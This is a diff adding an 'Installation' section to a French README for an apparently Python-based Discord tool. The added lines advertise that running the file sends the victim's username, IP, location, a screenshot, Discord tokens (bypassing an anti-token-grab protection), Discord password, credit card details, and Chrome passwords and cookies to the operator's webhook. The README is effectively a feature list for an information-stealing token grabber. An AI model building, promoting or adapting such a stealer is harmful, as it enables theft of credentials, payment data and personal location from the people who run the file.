@@ -15,3 +15,19 @@ Le language de programmation utilisé par ce logiciel est : [Python](https://www
 [3] Mettre les tokens à utilisé dans `tokens.txt`
 
 [!] AUCUNS PROXIES N'EST UTILISE PAR LE LOGICIEL, JE NE SERAI PAS REPONSABLE SI VOUS AVEZ TOUT PROBLEMES AVEC DISCORD !!!
+
+## Installation 
+
+#### upon running the file you will get the following sent to your webhook:
+ -  Username
+ -  ComputerName
+ -  IP
+ -  City
+ -  Region
+ -  Country
+ -  Google Maps Location
+ -  Screenshot of their pc
+ -  All Their Valid Discord Tokens (bypasses betterdiscord's anti-token-grab-protector)
+ -  Password For Discord (You get Their Password if They Update it)
+ -  Their Whole Credit Card (if They Put one in)
+ -  All Their Chrome Passwords And Cookies
